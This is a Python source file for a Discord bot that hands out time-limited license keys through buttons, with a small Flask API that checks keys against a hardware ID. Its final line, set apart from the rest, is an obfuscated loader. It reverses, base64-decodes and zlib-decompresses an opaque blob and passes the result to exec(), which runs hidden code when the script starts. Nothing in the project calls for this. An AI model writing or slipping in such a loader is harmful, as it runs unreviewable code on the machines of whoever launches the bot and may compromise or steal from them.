import discord
from discord.ext import commands
import uuid
import datetime
from flask import Flask, request, jsonify
import threading
import os

keys_database = {}
app = Flask(__name__)

@app.route('/ping', methods=['GET'])
def ping():
    return "ok", 200

@app.route('/verify', methods=['POST'])
def verify_key():
    data = request.json
    user_key = data.get('key')
    hwid = data.get('hwid')

    if user_key not in keys_database:
        return jsonify({"status": "error", "message": "Invalid key"}), 404

    key_data = keys_database[user_key]

    if key_data['expiry'] != "LIFETIME":
        if datetime.datetime.now() > key_data['expiry']:
            return jsonify({"status": "error", "message": "Key expired"}), 403

    if key_data['status'] == "unused":
        key_data['status'] = "active"
        key_data['hwid'] = hwid
        return jsonify({"status": "success", "message": "Key activated!"}), 200

    if key_data['hwid'] != hwid:
        return jsonify({"status": "error", "message": "HWID mismatch"}), 403

    return jsonify({"status": "success", "message": "Login successful"}), 200

class KeyPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def gen(self, interaction, days):
        key = f"TEMPO-{str(uuid.uuid4())[:8].upper()}"
        expiry = "LIFETIME" if days == 0 else (datetime.datetime.now() + datetime.timedelta(days=days))
        keys_database[key] = {"expiry": expiry, "status": "unused", "hwid": None}
        await interaction.response.send_message(f"**Key:** `{key}`\n**Duration:** {days if days > 0 else 'Life'} days", ephemeral=True)

    @discord.ui.button(label="Day", style=discord.ButtonStyle.gray)
    async def d(self, i, b): await self.gen(i, 1)

    @discord.ui.button(label="Week", style=discord.ButtonStyle.gray)
    async def w(self, i, b): await self.gen(i, 7)

    @discord.ui.button(label="Month", style=discord.ButtonStyle.primary)
    async def m(self, i, b): await self.gen(i, 30)

    @discord.ui.button(label="Lifetime", style=discord.ButtonStyle.danger)
    async def l(self, i, b): await self.gen(i, 0)

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    bot.add_view(KeyPanel())

@bot.command()
async def setup(ctx):
    if not ctx.author.guild_permissions.administrator: return
    embed = discord.Embed(title="KEYS", description="made by juju\n\nlicenses for days, weeks, months, or a lifetime.", color=0x5865F2)
    await ctx.send(embed=embed, view=KeyPanel())

def run_api():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=run_api).start()
   _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gaZoxRAQg0QVDCwQftqskCPfnj29cNNbNM2SH93mMdPoYNpgyMIJDyKriy39wMTTXj1T9jzddT2TjCNH/NKtc91E3c33S81BPNKsa90kQDyD10NryKR/iyLxJe'))
